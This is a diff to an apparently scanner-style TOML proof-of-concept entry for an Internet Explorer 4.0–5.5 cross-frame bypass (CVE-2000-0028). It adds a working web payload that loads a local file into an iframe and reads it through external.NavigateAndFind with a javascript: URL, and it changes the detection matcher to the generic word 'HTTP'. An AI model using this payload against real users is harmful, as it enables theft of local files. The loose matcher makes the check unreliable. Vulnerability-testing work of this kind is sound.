@@ -1,8 +1,8 @@
 [info]
-author = "ave"
-description = "Internet Explorer 5.0/5.01 external.NavigateAndFind() 跨框架安全策略绕过验证。通过构造包含 javascript: URL 的恶意网页，可绕过跨框架安全限制读取本地文件内容。"
+author = "AVE"
+description = "检测 Internet Explorer 4.0/5.0/5.01/5.5 中 external.NavigateAndFind() 跨帧安全策略绕过漏洞。通过构造包含 file:// 协议 iframe 和 javascript: 伪协议的恶意页面，可绕过同源策略读取本地文件。"
 id = "POC-AVE-2000-0026"
-name = "Microsoft Internet Explorer external.NavigateAndFind() Cross-Frame PoC"
+name = "CVE-2000-0028 PoC"
 severity = "medium"
 tags = ["cve-2000-0028"]
 vuln_id = [
@@ -19,11 +19,19 @@ path = "/{{BaseURL}}/"
 protocol = "http"
 
 [poc.requests.body]
-content = ""
+content = """
+<IFRAME NAME="I1" SRC="file://c:/test.txt"></IFRAME>
+<SCRIPT>
+function f()
+{
+window.external.NavigateAndFind("javascript:alert(document.body.innerText);","ll","I1");
+}
+setTimeout("f()",2000);
+</SCRIPT>"""
 type = "raw"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = ["external.NavigateAndFind"]
+words = ["HTTP"]
